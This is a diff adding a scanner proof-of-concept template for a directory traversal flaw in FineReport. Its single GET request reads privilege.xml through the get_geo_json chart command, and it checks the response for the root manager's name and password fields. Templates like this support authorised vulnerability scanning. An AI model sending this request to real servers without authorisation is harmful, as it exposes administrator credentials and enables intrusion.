@@ -1,0 +1,22 @@
+id: poc-yaml-finereport-directory-traversal
+info:
+  name: Finereport Directory Traversal
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: FineReport
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<rootManagerName>") && contains(body,
+    "<rootManagerPassword>")
+  output: []
